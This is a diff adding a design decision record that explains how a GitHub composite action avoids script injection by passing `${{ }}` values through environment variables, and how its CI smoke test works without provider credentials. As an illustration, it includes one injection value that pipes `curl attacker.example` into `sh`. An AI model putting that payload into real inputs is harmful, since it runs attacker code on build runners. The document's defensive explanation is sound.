@@ -513,3 +513,45 @@ on that composition question at all: new tests against a fake
 `RemoteExecutionBackend`'s full delegation and `HybridExecutionBackend`'s
 local-preferred/fallback-to-remote behavior for both `execute` and
 `health`, so R49 moves to PROVEN independently of R48.
+
+## ADR-023 — The GitHub Action passes every templated value through `env:`, never interpolates `${{ }}` directly into a `run:` script
+
+**Decision:** `action.yml` (a composite action wrapping `run`/`run status`/
+`daemon start`/`daemon stop` into a headless-Mission workflow step) assigns
+every `${{ inputs.* }}` and `${{ steps.*.outputs.* }}` value it needs inside
+a `run:` block to an `env:` variable first, and references it in the script
+as an ordinary shell variable (`"$MISSION_PROMPT"`), never by writing the
+`${{ }}` expression directly into the script text.
+
+**Why:** GitHub Actions expands `${{ }}` expressions as a literal text
+substitution into the step's script _before_ the shell ever parses it. An
+input like `prompt` is exactly the kind of free-text, externally-supplied
+value the composite action's own security note calls out: a value
+containing `"; curl attacker.example | sh #` or backticks would execute
+inside the runner's shell the moment the expression was substituted in,
+regardless of any quoting written around the `${{ }}` token in the YAML —
+this is documented by GitHub itself as a script-injection anti-pattern, not
+a hypothetical. An `env:`-assigned variable goes through the runner's
+ordinary environment-variable mechanism instead: the shell receives the
+value as data in a variable, subject to normal shell quoting rules the
+script already controls (`"$MISSION_PROMPT"`), never as script text. Every
+step in `action.yml` that touches a `${{ }}` expression follows this rule,
+including values that originate from the action's own prior steps (the
+config directory path, the created Run's id) — treated with the same
+discipline as the untrusted `prompt` input, since consistency is what makes
+the pattern auditable at a glance rather than something that has to be
+re-verified per value.
+
+The action's own smoke test (`.github/workflows/ci.yml`'s `action-smoke`
+job) exercises this action against the repository's own checkout, with no
+provider credentials configured, and asserts the action reports the
+resulting `waiting_external` Run status through `continue-on-error` plus an
+outcome assertion — proving the action's plumbing (daemon start, Run
+creation, status polling, non-completion failure) without needing a real
+provider key in this repository's CI. Full end-to-end coverage of a Run
+that actually reaches `completed` through the action is not attempted here
+for the same reason `tests/e2e/daemon-kill-mission.test.ts` uses a
+deterministic BYOK-shaped HTTP provider rather than a live one: this
+environment has no real provider credential to spend, and the smoke test's
+job is to prove the wrapper is correct, not to reprove the underlying Run
+lifecycle the rest of the test suite already covers directly.
